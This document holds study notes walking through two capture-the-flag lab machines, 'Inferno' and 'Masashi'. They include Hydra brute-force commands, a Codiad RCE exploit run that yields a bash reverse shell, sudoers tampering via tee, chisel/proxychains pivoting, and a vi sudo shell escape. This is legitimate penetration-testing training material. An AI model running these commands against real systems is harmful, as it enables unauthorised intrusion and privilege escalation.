# Inferno #


Skills
- Note: On this machine we have configured an internal network to Pivot to Empire: Masashi: 1
- Web Enumeration
- Basic Web Authentication Brute Force - Hydra
- Authenticated Codiad Exploitation - Remote Code Execution
- Information Leakage
- Abusing sudoers privilege in order to assign a new privilege in sudoers [Privilege Escalation]

- EXTRA: Creation of bash script to discover computers on the internal network
- EXTRA: Creation of a bash script to discover the open ports of the computers discovered in the internal network
- EXTRA: Remote Port Forwarding - Playing with Chisel
- EXTRA: Socks5 connection with Chisel (Pivoting)
- EXTRA: FoxyProxy + Socks5 Tunnel
- EXTRA: Fuzzing with gobuster through a Socks5 Proxy

Certifications

eWPT eCPPTv2


AT THE START WE MUST CONFIGURATE WELL THE LAN INTERFACES, in the :

nano /etc/network/interfaces configure both lan interfaces



nmap .. ports open 22,80

OpenSSH 7.9p1 Debian 10+deb10u2
Apache httpd 2.4.38 

debian
[Buster](https://launchpad.net/debian/buster)


ssh-hostkey: 
|   2048 82:f4:d2:47:74:86:2f:b4:94:62:cd:31:f6:ef:51:a4 (RSA)
Savitar says if you copy this until the half of the total ,and removing the letters
the first 9 numbers and the adjacent letter... this is the victim "DNI"
824247748f and this can be "important or usable"


what web 

http://172.16.2.186 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[172.16.2.186], Title[Dante's Inferno]  

When a website doesnt give you more information you must go to fuzz directorys
or enum directorys of the website, nmap haves a script

nmap --script http-enum 172.16.2.186 -oN webscan

this doesnt returns nothing.

Now we are going to use gobuster.  It is programmed on GO

```
gobuster dir -u http://172.16.2.186 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
```
we have two possible routes 
```
/inferno              (Status: 401) [Size: 459]
/server-status        (Status: 403) [Size: 277]
```

so now savitar want to do a bruteforce attack with an hypotetical "admin" user. Using hydra

```
hydra -l admin -P /home/cds/Documents/Workspace/pentesting/moneybox/rockyou.txt 172.16.2.186 http-get /inferno -t 60
```

we have credentials 
```
[80][http-get] host: 172.16.2.186   login: admin   password: dante1
```

another web login we are going to watch it with 
we can authenticate at the start of the url as you can see
```
whatweb http://admin:dante1@172.16.2.186/inferno
```
But no... it doesnt work

```
[401 Unauthorized] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[172.16.2.186], Title[401 Unauthorized], WWW-Authenticate[Restricted Content][Basic]
```

fortunately our credentials worked when we tried to authenticate on the other login website.

This site is working on "codiad"

```
Codiad **es un IDE sencillo, basado en web, que se puede poner en marcha en un servidor para editar archivos del sistema y evita la carga de algunos editores de escritorio**

 **Infraestructura de Datos Espaciales** (IDE)
```


searchsploit gives us this  exploits

```
searchsploit codiad
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                       | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                           | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                          | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                      | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                      | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                      | multiple/webapps/50474.txt
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

we are going to  use codiad 2.8.4

```
python3 remote_exec.py http://admin:dante1@172.16.2.186/inferno/ admin dante1 172.16.0.140 443 linux

```

we have this message 

```
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/172.16.0.140/444 0>&1 2>&1"' | nc -lnvp 443
nc -lnvp 444
[+] Please confirm that you have done the two command above [y/n]
[Y/n] 
```

Aclaracion :
TE PONES EN ESCUCHA POR EL PUERTO 443

echo 'bash -c "bash -i >/dev/tcp/172.16.2.186/444 0>&1 2>&1"' | nc -lnvp 443

PARA UNA VEZ GANAS EL ACCESO A LA MAQUINA Y HAY CONEXION ENVIA UNA CONSOLA INTERACTIVA AL PUERTO 444


So this script worked.

remember.. tty and the variable 
export SHELL=/bin/bash

now he put (ocult folders (?)) 
```
find . 2>/dev/null | less
```

a strange file called: 
Is on hexadecimal
```
cat ./Downloads/.download.dat; echo

```

if you want to see the archive before being changed to hexadecimal you must put this command


xxd (hexadecimal)
-ps (transforms to another format... I think some like bites or something) numeric
-r (transforms to a readable i think) letters
echo shows it 
```
cat ./Downloads/.download.dat | xxd -ps -r; echo

```

Now we have this

```
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V1rg1l10h3lpm3


```
su dante : V1rg1l10h3lpm3

we connected via ssh.. its better 

and now im dante

now you must go to the root 

He said " before going to the suid , capabilities, etc..." we are going to see the 
sudo -l and watch if we can do something as sudo (without putting sudo password)
```
  (root) NOPASSWD: /usr/bin/tee

```
when we use things like 

echo "adios" | tee adios.txt

This command inserts "adios" , and creates a line inside of an archive, if the file exists replace the file.

but with tee -a (append) we put more data inside of a file


We can put more things on the etc sudoers

```
echo "dante ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers

```


So, we put sudo su without password and we are root. 

we are going to discover the masashi from this machine


we are going to create a file called 
```

cd /tmp/ 
nano hostDiscovery.sh

```
&>/dev/null redirects the stdin and the stdout and we do not see it ..

```
ping -c 1 10.0.3.2 &>/dev/null

```

He said that we dont care about seeing nothing he just want to see the status code

```
root@Inferno:/tmp# ping -c 1  10.0.3.2 &>/dev/null 
root@Inferno:/tmp# echo $?
0
```

If the response is the same is because the host is active, otherwise it do not gonna work
```
ping -c 1  10.0.3.2 &>/dev/null && "echo [+] El host esta activo"
```
he will create 

```
root@Inferno:/tmp# cd /dev/shm/

nano hostDiscovery.sh

#!/bin/bash

for i in $(seq 1 254); do

timeout 1 bash -c "ping -c 1  10.0.3.$i" &>/dev/null && echo "[+] HOST 10.0.3.$i - ACTIVE" &
done; wait


```

result 

```
root@Inferno:/dev/shm# ./hostDiscovery.sh 
[+] HOST 10.0.3.15 - ACTIVE
[+] HOST 10.0.3.4 - ACTIVE
[+] HOST 10.0.3.2 - ACTIVE
[+] HOST 10.0.3.3 - ACTIVE

```

hostname -I returns our ip
(inferno ip 10.0.3.15)

i have four ips ...wtf !!!!!! savitar only one

i dont know what is happening... my ports are refusing me ...

so if we want to see open ports..

```
(echo '' > /dev/tcp/10.0.3.15/4) 2>/dev/null && echo "abierto"
```


I cannot conect the machines between them with nat... so... i will going to put just the two machines with bridget and making as i have no connection to the masashi

this is the script for the scan of ports from the inferno machine 

```
#!/bin/bash

function ctrl_c(){
     echo -e "\n\n[!] Saliendo...\n"
     tput cnorm; exit 1
}
trap ctrl_c INIT

tput civis #ocultar cursor
for port in $(seq 1 65535); do

timeout 1 bash -c "echo '' > /dev/tcp/192.168.100.80/$port" &>/dev/null && echo "[+] Port $port - OP$
done; wait

tput cnorm

```

He said now, if we have no acces to this machine because it is on another network, we would do it with chisel
"creamos tunel ,conexion de tipo socks que con proxichains a posteriori intentamos aplicar el escaneo desde nuestra maquina a la maquina que de primeras no alcanzamos pero vamos a intentar que alcance"

It works like this, from your side you run int as a "server" and from the target machine is connecting as "client"

First you must do a server with python and download it from the target machine with 

on your folder and from your machine
```
python3 -m http.server 80
```

on the target machine
```
wget 192.168.100.4/chisel
```

Now on your machine you must run the chisel as a server 

```
./chisel server --reverse -p 1234 
```
And on the victims machine


R transforms the port, to my 80 port, so i must go step by step port to port doing this
```
./chisel client 172.16.0.140:1234 R:80:10.10.0.128
```
He prefers do it on this way, I think you take all the ports
```
./chisel client 172.16.0.140:1234 R:socks
```
NOTA: si lo detecta el antivurus a chisel, en la maquina victima, puedes usar Evilwinrm para cargarlo directamente en la memoria de la computadora (usar amsybypass).

So now youre using R:socks now you must go to
```
/etc/proxychains.conf
```
we must have a "stricy chain"

and on the proxys you must put


```
socks5 127.0.0.1 1080
```
why this way ? it is where the "tunnel" is created and now you want to use this  "tunnel" to consult all the things via this tunnel

so now, if i want to scan this machine (that hipotetically is out of my range, now with proxychains is on my way) You will have a lot of information un usefull if you dont want to see the "stderr (standar error flux)" you can redirect it with 2/dev/null

```
proxychains nmap --top-ports 500 --open -T5 -V -sT -Pn -n 10.10.0.128 2>/dev/null
```
So now, if you want to see the 10.10.0.128 you can use "foxyproxy" and "add" a new proxy


here he shows the option that are correct to run the proxy and see the masashi machine

![[Screenshot_2023-08-20_14_52_37.png]]

Now you can see al the websites that the machine have to offer to you

so now, we are going to enumerate the masashi machine with gobuster
but adding a new option  --proxy with our proxy configuration
and adding extensions with -x
```
gobuster dir -u http://10.10.0.128 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 --proxy socks5://127.0.0.1:1080 -x txt,html,php
```

we have this and another caled /server-status
```
/index.html           (Status: 200) [Size: 10657]
/security.txt         (Status: 200) [Size: 54]
/robots.txt           (Status: 200) [Size: 72]
```

this is in /robots.txt
```
User-agent: *
Disallow: /
	/snmpwalk.txt
	/sshfolder.txt
	/security.txt
```

on snmpwalk he said "is running tftpd (daemon) on the port 1137 and we can try to connect via tftp via 1137" because we have two keys ssh rsa_pub and rsa in the sshfolder
```
|  403:
|	Name: cron
|	Path: /usr/sbin/cron
|	Params: -f
|  768:
|	Name: tftpd
|	Path: /usr/sbin/tftpd
|	Params: -- listen â€” user tftp -- address 0.0.0.0:1337 -- secure /srv/tftp
|  806:
|	Name: mysqld
|	Path: /usr/sbin/mysqld
|	Params: -i 0.0.0.0
```
ssh 
```
http://172.16.2.187/sshfolder.txt

sv5@masashi:~/srv/tftp# ls -la
total 20
drwx------  2 sv5 sv5 4096 Oct 15 19:34 .
drwxr-xr-x 27 sv5 sv5 4096 Oct 21 12:37 ..
-rw-------  1 sv5 sv5 2602 Oct 15 19:34 id_rsa
-rw-r--r--  1 sv5 sv5  565 Oct 15 19:34 id_rsa.pub
sv5@masashi:~/srv/tftp#
```

we are going to try this : 
```
proxychains tftp 10.10.0.128:1337

```
we have no results, but we have a user "sv5"
and we are going to try to make a bruteforce attack with a custom dictionary with the words of the default page of apache.

```
cewl -w diccionario.txt http://172.16.2.187
```

now with hydra launch the attack 

```
proxychains hydra -l sv5 -P diccionario.txt ssh://172.16.2.187 -t 60 2>/dev/null
```

The user and pass :

22][ssh] host: 172.16.2.187   login: sv5   password: whoistheplug

how to connect 
```
proxychains ssh sv5@10.10.0.128
```

we're in

id 
sudo -l
(i can use vim as a root on the tmp folder..)
```
(ALL) NOPASSWD: /usr/bin/vi /tmp/*
```


sudo vi /tmp/prueba 
```
esc
shift+:
set shell=/bin/bash
esc
shift+:
shell
```
now you put whoami and the bash is spawned as a root

end.
# Masashi #

Skills
- Creating a customized dictionary with cewl
- SSH Brute Force - Hydra

- Abusing Sudoers Privilege (Privilege Escalation)

Certifications

eWPT eCPPTv2


### Description


When you open the Virtual Machine in VMware and it says "failed", Dont be alarmed, just click "try again"

PS. There is no need for you to setup networking for the VM, its on NAT annd DHCP.

If you face any challenges, DM on Twitter @lorde_zw

Have Fun ;) ;)